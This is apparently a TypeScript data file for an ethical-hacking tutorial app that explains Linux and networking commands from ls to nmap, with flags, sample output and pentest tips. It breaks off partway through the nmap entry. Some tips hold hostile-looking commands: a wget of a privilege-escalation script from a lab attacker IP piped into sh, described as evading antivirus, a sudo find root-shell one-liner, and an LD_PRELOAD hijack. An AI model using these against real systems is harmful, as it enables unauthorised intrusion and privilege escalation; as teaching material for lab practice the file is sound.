import { CommandItem } from '../types';

export const COMMANDS: CommandItem[] = [
  // ==========================================
  // LINUX BASICS
  // ==========================================
  {
    id: 'ls',
    name: 'ls',
    syntax: 'ls [options] [directory]',
    categoryId: 'linux-basics',
    level: 'beginner',
    howItWorks: "Imagine opening a toy box or office cabinet and glancing inside to see all the folder names and file labels laying there. 'ls' lists the contents of whatever folder you are currently looking at.",
    purpose: "Used continuously during every phase of ethical hacking to explore the target system's directories, check for hidden script files, verify file size, and inspect read/write/execute permissions.",
    example: 'ls -lah /var/log',
    sampleOutput: `total 1.2M
drwxr-xr-x  7 root root 4.0K Oct 30 14:22 .
drwxr-xr-x 14 root root 4.0K May 12  2024 ..
-rw-r--r--  1 root root  84K Oct 30 18:01 auth.log
-rw-r-----  1 root adm  412K Oct 30 18:00 syslog
drwxr-xr-x  2 root root 4.0K Oct 15 09:12 apache2`,
    flags: [
      { flag: '-l', description: 'Long format: lists permissions, owner, group, byte size, and timestamp' },
      { flag: '-a', description: 'Show all files, including hidden dotfiles like .bash_history or .ssh/' },
      { flag: '-h', description: 'Human-readable units: prints 4K, 12M, 2G instead of raw byte counts' },
      { flag: '-t', description: 'Sort chronologically by modification time, newest files at the top' },
      { flag: '-R', description: 'Recursive: traverses and lists every nested subdirectory' },
    ],
    advantages: [
      'Universal across every Linux, Unix, BSD, and macOS installation.',
      'Extremely fast and produces zero disk writes or network noise.',
      'Essential for identifying misconfigured permissions and hidden configurations.',
    ],
    disadvantages: [
      'Does not show file content or file mime-types directly.',
      'Massive folders with hundreds of thousands of files can flood terminal memory.',
    ],
    whatNotToDo: [
      'Do not run wildcards like `rm *` in folders containing unknown filenames like `-rf`, which hijack tool options.',
      'Do not rely solely on standard `ls` without `-a`; critical CTF flags and SSH keys are usually hidden dotfiles.',
    ],
    advancedExample: {
      command: 'ls -latr --time-style=+%Y-%m-%d\\ %H:%M:%S /etc',
      explanation: 'Sorts files in reverse chronological order with exact ISO timestamps to spot recently modified or backdoor configuration files.',
      output: `-rw-r--r-- 1 root root  2048 2026-10-30 15:42:10 shadow\n-rw-r--r-- 1 root root   912 2026-10-30 16:10:05 sudoers`,
    },
    proTip: "Beware of option injection in untrusted folders. If a file is named '-la', running 'ls *' treats that file as an option. Use 'ls -- *' to tell the shell that option flags have ended.",
    tags: ['files', 'directory', 'list', 'navigation', 'basics'],
  },
  {
    id: 'cd',
    name: 'cd',
    syntax: 'cd [directory_path]',
    categoryId: 'linux-basics',
    level: 'beginner',
    howItWorks: "Think of it like walking from the living room into the kitchen. 'cd' stands for Change Directory, transporting your terminal cursor into any folder path you specify.",
    purpose: "Fundamental directory navigation across the file system to reach target binaries, wordlists, output dumps, and mount points.",
    example: 'cd /usr/share/wordlists',
    sampleOutput: `kali@kali:/usr/share/wordlists$ pwd
/usr/share/wordlists`,
    flags: [
      { flag: '..', description: 'Step up exactly one directory level into the parent directory' },
      { flag: '~', description: 'Jump immediately to your current user\'s home folder (/home/kali)' },
      { flag: '-', description: 'Jump back to whichever directory you were in immediately prior' },
      { flag: '/', description: 'Jump straight to the root of the entire file system' },
    ],
    advantages: [
      'Built directly into the shell (built-in command), executing in zero milliseconds.',
      'Supports auto-completion with Tab key to prevent spelling mistakes.',
    ],
    disadvantages: [
      'Only changes the working directory for the current shell session, not background subshells.',
    ],
    whatNotToDo: [
      'Do not forget quotes around directory names containing spaces or special symbols (`cd "My Lab Notes"`).',
      'Do not get lost in nested deep trees; remember `cd -` brings you back instantly.',
    ],
    advancedExample: {
      command: 'cd $(dirname $(which nmap))',
      explanation: 'Uses command substitution to change directory directly into whichever folder houses the nmap binary.',
      output: `kali@kali:/usr/bin$`,
    },
    proTip: "Use 'pushd /path' and 'popd' when jumping back and forth across multiple target project directories during a pentest to maintain a clean navigation stack.",
    tags: ['navigation', 'path', 'directory', 'folder', 'cd'],
  },
  {
    id: 'rm',
    name: 'rm',
    syntax: 'rm [options] <file_or_directory>',
    categoryId: 'linux-basics',
    level: 'beginner',
    howItWorks: "Like putting a paper note straight through an industrial paper shredder. Unlike graphical desktops, Linux has NO Recycle Bin or Trash can—when 'rm' deletes a file, it unlinks the inode forever.",
    purpose: "Cleaning up temporary exploit payloads, removing wordlists, sanitizing pentest artifacts, and managing disk storage on your Kali machine.",
    example: 'rm -v payload.elf',
    sampleOutput: `removed 'payload.elf'`,
    flags: [
      { flag: '-r / -R', description: 'Recursive: deletes a directory and every single file inside it' },
      { flag: '-f', description: 'Force: ignores nonexistent files and never prompts for confirmation' },
      { flag: '-i', description: 'Interactive: prompts for confirmation before every removal' },
      { flag: '-v', description: 'Verbose: displays each file name as it is deleted' },
    ],
    advantages: [
      'High speed disk clean-up without leaving debris in UI trash bins.',
      'Supports batch globbing patterns to clean specific extensions like *.pcap.',
    ],
    disadvantages: [
      'IRREVERSIBLE. There is no undo or restore button in standard Linux.',
      'A small typo in path names can wipe critical operating system files.',
    ],
    whatNotToDo: [
      'NEVER run `rm -rf /*` or `rm -rf /` as root! It destroys the entire operating system permanently.',
      'Do not run `rm -rf *` inside a directory without first verifying with `pwd` where you are standing.',
    ],
    advancedExample: {
      command: 'find /tmp -type f -name "*.tmp" -mtime +7 -exec rm -f {} \\;',
      explanation: 'Finds and safely purges all temporary files older than 7 days from the /tmp directory.',
      output: `All 7+ day old tmp files purged.`,
    },
    proTip: "To prevent accidental deletion disasters, create a shell alias `alias rm='rm -I'` in ~/.bashrc, which warns once before deleting more than three files or when removing recursively.",
    tags: ['remove', 'delete', 'files', 'cleanup', 'rm'],
  },
  {
    id: 'chmod',
    name: 'chmod',
    syntax: 'chmod [permissions] [target_file]',
    categoryId: 'linux-basics',
    level: 'beginner',
    howItWorks: "Hands out permission badges: who is allowed to Read (inspect), Write (modify or delete), or Execute (run like a program) a file. Can be set using symbols (+x) or 3-digit octal codes (755).",
    purpose: "Crucial for making downloaded scripts and compiled exploits executable (`chmod +x exploit.sh`), locking down sensitive private keys (`chmod 600 id_rsa`), and auditing SUID binaries.",
    example: 'chmod +x exploit.sh',
    sampleOutput: `kali@kali:~$ ls -l exploit.sh
-rwxr-xr-x 1 kali kali 820 Oct 30 12:10 exploit.sh`,
    flags: [
      { flag: '+x', description: 'Adds executable flag for current user, group, and others' },
      { flag: '700', description: 'Owner can read, write, and execute; zero access to anyone else' },
      { flag: '600', description: 'Owner can read and write; required for SSH keys and certificates' },
      { flag: '755', description: 'Owner has full control; everyone else can read and execute' },
      { flag: 'u+s', description: 'Set SUID bit: runs file under the owner\'s identity (often root)' },
    ],
    advantages: [
      'Enforces granular Unix discretionary access control (DAC).',
      'Protects private SSH keys and passwords from other users on multi-user systems.',
    ],
    disadvantages: [
      'Misconfigurations like 777 create critical privilege escalation vulnerabilities.',
    ],
    whatNotToDo: [
      'Never grant 777 permissions to fix a permission error; determine the proper user ownership instead.',
      'Never set SUID (`chmod u+s`) on scripting interpreters like Python or Bash on shared systems.',
    ],
    advancedExample: {
      command: 'chmod u+s /opt/backup && ls -la /opt/backup',
      explanation: 'Sets the SUID bit on a binary, causing it to execute with the file owner\'s permissions.',
      output: `-rwsr-xr-x 1 root root 18240 Oct 30 14:15 /opt/backup`,
    },
    proTip: "OpenSSH strictly enforces permission hygiene. If your private key (`~/.ssh/id_rsa`) has permissions looser than 600 (e.g. 644 or 777), SSH will refuse to authenticate and exit with a 'UNPROTECTED PRIVATE KEY FILE' warning.",
    tags: ['permissions', 'security', 'execute', 'chmod', 'users'],
  },
  {
    id: 'sudo',
    name: 'sudo',
    syntax: 'sudo [options] <command>',
    categoryId: 'linux-basics',
    level: 'beginner',
    howItWorks: "Stands for 'SuperUser DO'. It lets a trusted user temporarily borrow the superhero powers of the root administrator to perform privileged tasks without logging in as root permanently.",
    purpose: "Required for low-level network operations (SYN scans, packet sniffing), installing system packages via apt, mounting drives, and modifying system configurations.",
    example: 'sudo apt update',
    sampleOutput: `[sudo] password for kali:
Hit:1 http://http.kali.org/kali kali-rolling InRelease
Reading package lists... Done`,
    flags: [
      { flag: '-l', description: 'List allowed (and forbidden) commands for the invoking user' },
      { flag: '-u <user>', description: 'Execute the command as another specified user instead of root' },
      { flag: '-i', description: 'Simulate full initial login as root, loading root environment and shell' },
      { flag: '-s', description: 'Run the shell specified by SHELL environment variable as superuser' },
    ],
    advantages: [
      'Provides granular role-based delegation without sharing the root master password.',
      'Logs every command to `/var/log/auth.log` for security audit trails.',
    ],
    disadvantages: [
      'Insecure sudoers configuration (`NOPASSWD: ALL` or GTFOBins binaries) leads to instant root privilege escalation.',
    ],
    whatNotToDo: [
      'Do not run internet browsers or untrusted community scripts blindly with `sudo`.',
      'Never leave terminal windows unattended with an active cached sudo credential token.',
    ],
    advancedExample: {
      command: 'sudo -l',
      explanation: 'Enumerates which root binaries can be executed without passwords, the first step in Linux privilege escalation.',
      output: `User kali may run the following commands on kali:
    (root) NOPASSWD: /usr/bin/find`,
    },
    proTip: "Look for 'SETENV:' tags in `sudo -l` output. If present, an attacker can hijack library paths (`LD_PRELOAD=/tmp/evil.so`) to break out into a root shell even if the binary itself is not on GTFOBins.",
    tags: ['sudo', 'root', 'admin', 'privilege', 'superuser'],
  },
  {
    id: 'apt',
    name: 'apt',
    syntax: 'sudo apt [update | upgrade | install | remove] [package]',
    categoryId: 'linux-basics',
    level: 'beginner',
    howItWorks: "The official package warehouse of Kali Linux. It safely searches, downloads, verifies digital signatures, and installs cybersecurity tools from verified Kali repositories.",
    purpose: "Keeping Kali's toolset up to date, installing new security utilities (like gobuster, seclists, or docker), and resolving dependencies automatically.",
    example: 'sudo apt update && sudo apt install -y gobuster',
    sampleOutput: `Hit:1 http://http.kali.org/kali kali-rolling InRelease
Reading package lists... Done
Building dependency tree... Done
The following NEW packages will be installed:
  gobuster (3.6.0-0kali1)
0 upgraded, 1 newly installed, 0 to remove and 12 not upgraded.`,
    flags: [
      { flag: 'update', description: 'Refreshes package database index from Kali distribution servers' },
      { flag: 'full-upgrade', description: 'Smartly installs newer packages and handles dependency shifts' },
      { flag: 'install <pkg>', description: 'Downloads and installs the specified software package' },
      { flag: 'search <term>', description: 'Searches the entire repository index for matching tools' },
      { flag: 'purge <pkg>', description: 'Deletes the package along with all its configuration files' },
    ],
    advantages: [
      'Verifies cryptographic GPG signatures on all packages to prevent malware tampering.',
      'Handles complex library dependencies automatically.',
    ],
    disadvantages: [
      'Adding unverified third-party PPA repositories can create dependency hell and break Kali rolling release.',
    ],
    whatNotToDo: [
      'NEVER add random Ubuntu PPAs to `/etc/apt/sources.list` in Kali! This breaks package compatibility.',
      'Do not interrupt `apt full-upgrade` midway through kernel installations.',
    ],
    advancedExample: {
      command: 'apt-cache search "password cracker" | head -n 5',
      explanation: 'Searches local package cache for tools matching specific security functions.',
      output: `john - tool to find weak passwords\nhashcat - World's fastest and most advanced password recovery tool`,
    },
    proTip: "Never run 'sudo apt full-upgrade' during an active penetration test or live engagement. Rolling distribution updates may update glibc, python, or Metasploit libraries and break in-flight scripts.",
    tags: ['package', 'install', 'update', 'upgrade', 'apt'],
  },
  {
    id: 'grep',
    name: 'grep',
    syntax: 'grep [options] "pattern" [file_or_stream]',
    categoryId: 'linux-basics',
    level: 'beginner',
    howItWorks: "A high-powered digital magnifying glass. It scans through millions of lines of text and prints only the exact lines that contain the keyword or pattern you asked for.",
    purpose: "Essential for sifting through massive scan results, extracting credentials from configuration dumps, filtering logs for failed logins, and finding vulnerabilities in source code.",
    example: 'grep -rn "password" /var/www/html/',
    sampleOutput: `/var/www/html/config.php:14:$db_password = 'SuperSecretPassword123!';
/var/www/html/auth.php:45:if ($password == 'admin') {`,
    flags: [
      { flag: '-r / -R', description: 'Recursive search through all subdirectories' },
      { flag: '-n', description: 'Print the exact line number where the match occurs' },
      { flag: '-i', description: 'Case-insensitive search (matches PASS, pass, Password)' },
      { flag: '-v', description: 'Invert match: print all lines that DO NOT match the pattern' },
      { flag: '-E', description: 'Extended regular expressions (supports (a|b), +, ?)' },
    ],
    advantages: [
      'Incredible speed even on multi-gigabyte files.',
      'Integrates seamlessly with Unix pipes (`cat file | grep text`).',
    ],
    disadvantages: [
      'Does not parse binary formats (like compiled .exe or compressed databases) well without special flags.',
    ],
    whatNotToDo: [
      'Do not forget quotes around patterns containing regex symbols or spaces.',
      'Do not run recursive grep on `/proc` or `/dev` virtual filesystems without excluding them.',
    ],
    advancedExample: {
      command: 'grep -E -o "([0-9]{1,3}[\\.]){3}[0-9]{1,3}" nmap_output.txt | sort -u',
      explanation: 'Uses regular expressions to extract all unique IPv4 addresses from an unstructured scan file.',
      output: `10.10.10.5\n10.10.10.12\n192.168.1.1`,
    },
    proTip: "Use `grep -C 3 'pattern' file.txt` to display 3 lines of context BEFORE and AFTER the match, making it easy to see the function or variable definitions surrounding a hardcoded secret.",
    tags: ['search', 'grep', 'filter', 'regex', 'text'],
  },
  {
    id: 'find',
    name: 'find',
    syntax: 'find [starting_dir] [criteria] [action]',
    categoryId: 'linux-basics',
    level: 'beginner',
    howItWorks: "A bloodhound hound dog for files. It traverses the entire storage system searching for files based on name, size, owner, modification date, or security permissions.",
    purpose: "Locating CTF flag files (`flag.txt`), finding world-writable directories (`/tmp`, `/dev/shm`), and hunting for vulnerable SUID binaries during privilege escalation.",
    example: 'find / -perm -u=s -type f 2>/dev/null',
    sampleOutput: `/usr/bin/passwd
/usr/bin/sudo
/usr/bin/pkexec
/opt/backup_tool`,
    flags: [
      { flag: '-name "<pattern>"', description: 'Search by filename (supports wildcards like "*.php")' },
      { flag: '-type f / d', description: 'Filter by file type (f = regular file, d = directory)' },
      { flag: '-perm -4000', description: 'Search for files with the Set-UID (SUID) permission bit set' },
      { flag: '-mtime -1', description: 'Files modified within the last 24 hours' },
      { flag: '-exec <cmd> {} \\;', description: 'Execute a command on every matching file found' },
    ],
    advantages: [
      'Unmatched search flexibility across permissions, timestamps, sizes, and names.',
      'Supports executing inline actions directly on discovered files.',
    ],
    disadvantages: [
      'Full root file system searches can generate significant disk I/O.',
    ],
    whatNotToDo: [
      'Do not forget `2>/dev/null` when running as an unprivileged user; thousands of permission-denied errors will flood your screen.',
      'Do not execute destructive commands via `-exec rm {}` without testing the search results first.',
    ],
    advancedExample: {
      command: 'find / -writable -type d 2>/dev/null | grep -Ev "(/proc|/sys)"',
      explanation: 'Finds all world-writable directories across the system where an attacker can drop payloads, excluding kernel virtual paths.',
      output: `/tmp\n/var/tmp\n/dev/shm`,
    },
    proTip: "If you have sudo rights to `find`, you can spawn an instant root shell by executing: `sudo find . -exec /bin/sh \\; -quit` via GTFOBins.",
    tags: ['find', 'search', 'files', 'permissions', 'suid'],
  },

  // ==========================================
  // NETWORKING
  // ==========================================
  {
    id: 'ip',
    name: 'ip',
    syntax: 'ip [options] [addr | link | route | neigh]',
    categoryId: 'networking',
    level: 'beginner',
    howItWorks: "The dashboard of your computer's internet connections. Checks your network card's IP address, tells you if the Wi-Fi or Ethernet cable is plugged in, and checks your gateway route.",
    purpose: "Replacing obsolete `ifconfig`, `ip` is used to inspect your local IP, determine your subnet range for scanning, and configure virtual interfaces or VPN tunnels.",
    example: 'ip -c -br a',
    sampleOutput: `lo               UNKNOWN        127.0.0.1/8 ::1/128
eth0             UP             192.168.1.142/24 fe80::a00:27ff:fe8e:d34/64
tun0             UP             10.10.14.22/16`,
    flags: [
      { flag: 'a / addr', description: 'Show all IP addresses assigned to all network interfaces' },
      { flag: '-br', description: 'Brief mode: prints interface name, status, and IP on a single concise line' },
      { flag: '-c', description: 'Colorized output for fast visual scanning' },
      { flag: 'route', description: 'Displays the kernel routing table and default internet gateway' },
      { flag: 'neigh', description: 'Displays the local ARP table cache (discovered local MAC/IP pairs)' },
    ],
    advantages: [
      'Modern, active standard supported across all modern Linux kernels.',
      'Handles policy-based routing, VLANs, and multi-IP alias interfaces seamlessly.',
    ],
    disadvantages: [
      'Syntax is slightly more verbose than legacy `ifconfig`.',
    ],
    whatNotToDo: [
      'Do not bring down your main interface (`ip link set dev eth0 down`) on a remote SSH connection!',
      'Do not configure overlapping subnets on multiple physical adapters.',
    ],
    advancedExample: {
      command: 'ip neigh show',
      explanation: 'Passively checks your ARP cache to view neighboring active hosts without sending detectable ping probes.',
      output: `192.168.1.1 dev eth0 lladdr 00:11:22:33:44:55 REACHABLE\n192.168.1.50 dev eth0 lladdr aa:bb:cc:dd:ee:ff STALE`,
    },
    proTip: "Use `ip neigh` during internal network audits. It exposes machines your Kali VM has recently spoken to without generating noisy ARP broadcast packets across the network.",
    tags: ['ip', 'interface', 'networking', 'address', 'ifconfig'],
  },
  {
    id: 'ping',
    name: 'ping',
    syntax: 'ping [options] <destination>',
    categoryId: 'networking',
    level: 'beginner',
    howItWorks: "Like playing digital sonar ping-pong. You throw a tiny packet (ICMP Echo) at another computer. If the other machine is awake and polite, it bounces back an Echo Reply.",
    purpose: "Testing raw network reachability, diagnosing packet loss, and measuring latency to target hosts, DNS servers, and gateways.",
    example: 'ping -c 3 8.8.8.8',
    sampleOutput: `PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=118 time=14.2 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=118 time=13.8 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=118 time=14.1 ms

--- 8.8.8.8 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms`,
    flags: [
      { flag: '-c <count>', description: 'Stop after sending specified number of packets (default in Linux is infinite)' },
      { flag: '-i <sec>', description: 'Interval between packets in seconds (e.g. 0.2 for rapid)' },
      { flag: '-W <timeout>', description: 'Time to wait for a response in seconds before marking as lost' },
      { flag: '-s <size>', description: 'Specify the payload byte size (useful for MTU testing)' },
    ],
    advantages: [
      'Zero setup required; universal reachability test.',
      'Provides accurate round-trip latency measurements in milliseconds.',
    ],
    disadvantages: [
      'Many modern firewalls and cloud servers silently drop ICMP pings while web and SSH ports remain wide open.',
    ],
    whatNotToDo: [
      'Never assume a host is dead or offline just because ping returns 100% packet loss.',
      'Do not leave ping running without `-c` inside automated scripts, or the script will hang indefinitely.',
    ],
    advancedExample: {
      command: 'ping -c 1 -W 1 10.10.10.5 > /dev/null && echo "Host Alive" || echo "Host Down"',
      explanation: 'Quick bash conditional to check host presence with a strict 1-second timeout.',
      output: `Host Alive`,
    },
    proTip: "Observe the TTL (Time To Live) in the ping reply! A TTL of ~64 usually indicates a Linux/Unix target, while ~128 points to a Windows machine, giving you instant OS fingerprinting.",
    tags: ['ping', 'icmp', 'latency', 'reachability', 'network'],
  },
  {
    id: 'ss',
    name: 'ss',
    syntax: 'ss [options]',
    categoryId: 'networking',
    level: 'intermediate',
    howItWorks: "Peeks at all the open doors (ports) and phone lines (sockets) on your machine to see who is listening for incoming connections or currently talking to outside servers.",
    purpose: "Replacing legacy `netstat`, `ss` is used to detect rogue listening backdoors, verify if web servers or database ports are active, and monitor active SSH connections.",
    example: 'sudo ss -tulpn',
    sampleOutput: `Netid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port  Process
tcp    LISTEN  0       128            0.0.0.0:22          0.0.0.0:*      users:(("sshd",pid=681,fd=3))
tcp    LISTEN  0       511            0.0.0.0:80          0.0.0.0:*      users:(("apache2",pid=1214,fd=4))
tcp    LISTEN  0       128          127.0.0.1:5432        0.0.0.0:*      users:(("postgres",pid=892,fd=7))`,
    flags: [
      { flag: '-t', description: 'Display TCP sockets' },
      { flag: '-u', description: 'Display UDP sockets' },
      { flag: '-l', description: 'Display only listening sockets waiting for connections' },
      { flag: '-p', description: 'Show the process name and PID using the socket (requires sudo)' },
      { flag: '-n', description: 'Show numeric port numbers (e.g. 22 instead of resolving "ssh")' },
    ],
    advantages: [
      'Extremely fast because it queries kernel netlink directly instead of reading /proc.',
      'Crucial for validating internal localhost-only services (127.0.0.1) that firewalls hide from external scans.',
    ],
    disadvantages: [
      'Requires root or sudo privileges to expose process names owned by other system users.',
    ],
    whatNotToDo: [
      'Do not forget `-n`; resolving service and domain names on thousands of sockets introduces severe lag.',
    ],
    advancedExample: {
      command: 'ss -o state established \'( dport = :http or dport = :https )\'',
      explanation: 'Filters and displays active outbound web connections and their TCP timer intervals.',
      output: `tcp ESTAB 0 0 192.168.1.142:45120 93.184.216.34:https timer:(keepalive,119min,0)`,
    },
    proTip: "Look specifically for services listening on `127.0.0.1` or `localhost`. These are internal services not accessible over the network—prime targets for SSH local port forwarding pivots (`ssh -L`).",
    tags: ['ports', 'sockets', 'listening', 'ss', 'netstat'],
  },
  {
    id: 'curl',
    name: 'curl',
    syntax: 'curl [options] <URL>',
    categoryId: 'networking',
    level: 'beginner',
    howItWorks: "A command-line web browser with no buttons or graphics. It talks directly to HTTP/HTTPS servers, downloads files, sends custom headers, and submits forms from your terminal.",
    purpose: "Testing REST APIs, downloading exploit scripts, analyzing HTTP response headers, bypassing client-side validation, and crafting custom web payloads.",
    example: 'curl -I https://httpbin.org/status/200',
    sampleOutput: `HTTP/2 200 
date: Thu, 30 Oct 2026 18:20:00 GMT
content-type: text/html; charset=utf-8
server: gunicorn/19.9.0
access-control-allow-origin: *`,
    flags: [
      { flag: '-I / --head', description: 'Fetch HTTP response headers only (great for server fingerprinting)' },
      { flag: '-L', description: 'Follow HTTP 301/302 redirects automatically' },
      { flag: '-o <file>', description: 'Write downloaded output to a local file instead of standard out' },
      { flag: '-k / --insecure', description: 'Allow connections to SSL sites with self-signed certificates in labs' },
      { flag: '-H "Header: Val"', description: 'Pass custom HTTP headers (e.g. Authorization or User-Agent)' },
      { flag: '-d "key=val"', description: 'Send an HTTP POST request with specified body data' },
    ],
    advantages: [
      'Scriptable across Bash and Python automation pipelines.',
      'Supports almost every network transfer protocol (HTTP, HTTPS, FTP, SFTP, SMB, LDAP).',
    ],
    disadvantages: [
      'Does not execute client-side JavaScript or render DOM mutations.',
    ],
    whatNotToDo: [
      'Never pipe untrusted curl downloads directly into bash (`curl url | bash`) without inspecting the code first!',
      'Do not forget `-k` when interacting with lab targets using untrusted internal SSL certificates.',
    ],
    advancedExample: {
      command: 'curl -s -X POST -H "Content-Type: application/json" -d \'{"user":"admin","pass":"secret"}\' http://target.lab/api/login',
      explanation: 'Sends a silent JSON API authentication request to a target endpoint.',
      output: `{"status":"success","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}`,
    },
    proTip: "Use `curl --resolve example.com:443:10.10.10.5 https://example.com` when testing virtual hosts on private target IPs instead of modifying your local `/etc/hosts` file.",
    tags: ['http', 'web', 'download', 'api', 'headers', 'curl'],
  },
  {
    id: 'wget',
    name: 'wget',
    syntax: 'wget [options] <URL>',
    categoryId: 'networking',
    level: 'beginner',
    howItWorks: "A non-interactive file retriever that runs in the background. It downloads entire web files, directories, or entire websites reliably even over unstable connections.",
    purpose: "Transferring scripts, tools, and binaries onto a compromised target machine, or mirroring public websites for offline OSINT reconnaissance.",
    example: 'wget http://10.10.14.22:8000/linpeas.sh',
    sampleOutput: `--2026-10-30 18:40:12--  http://10.10.14.22:8000/linpeas.sh
Connecting to 10.10.14.22:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 328104 (320K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 320.41K  2.41MB/s    in 0.1s

2026-10-30 18:40:12 (2.41 MB/s) - 'linpeas.sh' saved [328104/328104]`,
    flags: [
      { flag: '-O <file>', description: 'Write download to specified filename instead of default remote name' },
      { flag: '-q', description: 'Quiet mode: silences all progress output for discreet execution' },
      { flag: '-c', description: 'Continue: resumes an interrupted partial download' },
      { flag: '-m', description: 'Mirror: recursively clones a complete web folder structure' },
      { flag: '--no-check-certificate', description: 'Ignore SSL/TLS certificate warnings in private labs' },
    ],
    advantages: [
      'Automatically handles reconnections and resumes interrupted downloads.',
      'Installed by default on almost every Linux server distribution.',
    ],
    disadvantages: [
      'Less versatile than curl for custom HTTP headers and API interactions.',
    ],
    whatNotToDo: [
      'Do not mirror large websites with `-m` without setting depth limits (`-l 2`), or you may fill your hard drive.',
    ],
    advancedExample: {
      command: 'wget -q -O - http://10.10.14.22:8000/linpeas.sh | sh',
      explanation: 'Streams a privilege escalation script directly into memory execution without saving any file to target disk.',
      output: `[+] Linux Privilege Escalation Awesome Script starting...`,
    },
    proTip: "In post-exploitation on targets where curl is missing, `wget -O - <URL> | sh` runs scripts directly in memory without writing files to disk, bypassing basic file-creation Antivirus detection.",
    tags: ['download', 'wget', 'transfer', 'http', 'files'],
  },
  {
    id: 'ssh',
    name: 'ssh',
    syntax: 'ssh [options] [user]@[host]',
    categoryId: 'networking',
    level: 'beginner',
    howItWorks: "Creates an encrypted, secure tunnel over the internet directly into a remote computer, giving you a full interactive command line as if you were sitting right in front of it.",
    purpose: "Secure administrative access to servers, pivoting into internal target networks via dynamic SOCKS proxies, and transferring encrypted files.",
    example: 'ssh -i ~/.ssh/id_rsa kali@192.168.1.150',
    sampleOutput: `Linux target-lab 5.15.0-88-generic #98-Ubuntu SMP
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)
Last login: Wed Oct 29 18:02:11 2026 from 192.168.1.142
kali@target-lab:~$`,
    flags: [
      { flag: '-i <keyfile>', description: 'Identity file: path to private SSH authentication key' },
      { flag: '-p <port>', description: 'Connect to non-standard remote port (default is 22)' },
      { flag: '-L local:host:remote', description: 'Local port forward: binds local port to forward to remote service' },
      { flag: '-D <port>', description: 'Dynamic port forward: turns SSH session into a local SOCKS5 proxy' },
      { flag: '-N', description: 'Do not execute a remote command; useful for forwarding ports only' },
    ],
    advantages: [
      'Military-grade cryptographic encryption (ChaCha20, AES-GCM) protecting credentials from sniffers.',
      'Built-in tunneling and port forwarding allows seamless network pivoting.',
    ],
    disadvantages: [
      'Repeated failed attempts quickly lock user accounts or get blocked by fail2ban.',
    ],
    whatNotToDo: [
      'Never leave private keys (`id_rsa`) on compromised target machines.',
      'Never forward SSH agent credentials (`-A`) into untrusted target hosts.',
    ],
    advancedExample: {
      command: 'ssh -D 1080 -N -C -q user@192.168.1.150',
      explanation: 'Spawns an encrypted SOCKS5 proxy on local port 1080 to route all Kali tools (nmap, burp, curl) into the target internal network.',
      output: `[Proxy active on localhost:1080]`,
    },
    proTip: "Use `ssh -D 1080 -N user@target` combined with `/etc/proxychains4.conf`. This lets you prefix any Kali tool with `proxychains` (e.g. `proxychains nmap -sT 10.0.0.5`) to scan internal enterprise subnets through the pivot.",
    tags: ['ssh', 'remote', 'tunnel', 'shell', 'encryption'],
  },
  {
    id: 'dig',
    name: 'dig',
    syntax: 'dig [@dns_server] <domain> [record_type] [options]',
    categoryId: 'networking',
    level: 'intermediate',
    howItWorks: "Queries the internet's phonebook (DNS). Asks domain name servers what IP addresses, mail servers (MX), or text security verification codes (TXT) belong to a website.",
    purpose: "DNS reconnaissance, finding mail exchange servers, discovering subdomains, querying TXT SPF records, and checking for zone transfer (AXFR) vulnerabilities.",
    example: 'dig +short A scanme.nmap.org',
    sampleOutput: `45.33.32.156`,
    flags: [
      { flag: '+short', description: 'Terse answer: prints only the raw resolved answer data' },
      { flag: 'ANY', description: 'Query for all available DNS record types for the domain' },
      { flag: 'MX', description: 'Query Mail Exchange servers handling organization email' },
      { flag: 'TXT', description: 'Retrieve TXT records (often revealing SPF, DKIM, or cloud verification)' },
      { flag: '-x <ip>', description: 'Reverse lookup: queries PTR record to discover hostname from IP' },
      { flag: '+trace', description: 'Iterative trace from root name servers down to the authoritative server' },
    ],
    advantages: [
      'Flexible, clear output directly detailing DNS authority and TTL values.',
      'Fast troubleshooting of DNS routing issues and propagation.',
    ],
    disadvantages: [
      'Standard ANY queries are often rejected or rate-limited by modern Cloudflare/Cloud DNS.',
    ],
    whatNotToDo: [
      'Do not rely solely on public Google DNS (8.8.8.8) when auditing internal Active Directory domains; query the domain controller directly.',
    ],
    advancedExample: {
      command: 'dig axfr @ns1.target.lab target.lab',
      explanation: 'Attempts a full DNS Zone Transfer, which if misconfigured dumps the entire internal naming topology.',
      output: `target.lab.   300 IN SOA ns1.target.lab...\nadmin.target.lab. 300 IN A 10.10.10.2\ndev.target.lab.   300 IN A 10.10.10.3`,
    },
    proTip: "Use `dig +trace domain.com` to watch the resolution walk down from the 13 root DNS servers. This is the fastest way to detect DNS hijacking, malicious cache poisoning, or misconfigured intermediate glue records.",
    tags: ['dns', 'dig', 'domain', 'ip', 'lookup'],
  },

  // ==========================================
  // INFORMATION GATHERING & RECON
  // ==========================================
  {
    id: 'nmap',
    name: 'nmap',
    syntax: 'nmap [Scan Type...] [Options] {target specification}',
    categoryId: 'info-gathering',
    level: 'beginner',
    howItWorks: "The legendary flashlight of ethical hacking. It knocks on thousands of digital doors (ports) on a computer to see which doors are open, what software is answering, and what operating system is running.",
    purpose: "Network inventory, port scanning, identifying vulnerable service versions, firewall detection, and automated vulnerability scanning with Nmap Scripting Engine (NSE).",
    example: 'sudo nmap -sC -sV -p- -T4 10.10.10.5',
    sampleOutput: `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for target.lab (10.10.10.5)
Host is up (0.012s latency).
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Vulnerable Web App
3306/tcp open  mysql   MySQL 8.0.35`,
    flags: [
      { flag: '-sS', description: 'SYN Stealth scan: default as root; resets connection before completing 3-way handshake' },
      { flag: '-sV', description: 'Version detection: probes open ports to determine exact daemon and version' },
      { flag: '-sC', description: 'Script scan: runs default safe NSE scripts for discovery and banner grabbing' },
      { flag: '-p-', description: 'Scan all 65,535 TCP ports instead of just the default top 1,000' },
